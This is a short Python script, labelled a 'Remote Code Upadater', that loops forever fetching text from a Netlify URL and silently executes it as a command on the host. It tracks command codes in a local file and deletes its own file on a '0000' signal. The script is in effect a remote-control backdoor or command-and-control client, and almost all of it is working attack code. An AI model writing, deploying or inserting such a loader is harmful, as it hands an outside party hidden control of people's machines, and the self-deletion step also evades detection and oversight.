#Remote Code Upadater
import os 
import requests
import subprocess
import time
import allfunction
import sys
"""
Code        Type
----        -----
4444        One time Command
6666        Looped Command
9999        For shutdown Script
"""


script_id_number = 456



    
while True:    

    new_command_url = f"https://rcu-d.netlify.app/order/{script_id_number}"
    new_command = requests.get(new_command_url).text

    #online loaded command code

    command_number_online = new_command[0:4] #the important code
    if command_number_online == "0000":
        import sys, subprocess 
        subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
        sys.exit(0)
    code_status = allfunction.repeatchecker(command_number_online)

    if code_status is True:
        continue
    

    #cutting down the command number from main command

    new_command = new_command
    new_command = new_command.replace(command_number_online, "")
    print(new_command)

    if code_status is False:
        allfunction.comexesilent(new_command)
        print("command executed")
    else:
        print("no new command")    
    #command number online will be replaced on last_code file

    with open("last_code", "w") as replacer:
        replacer.write(str(command_number_online))
        replacer.close()
    

    time.sleep(5)

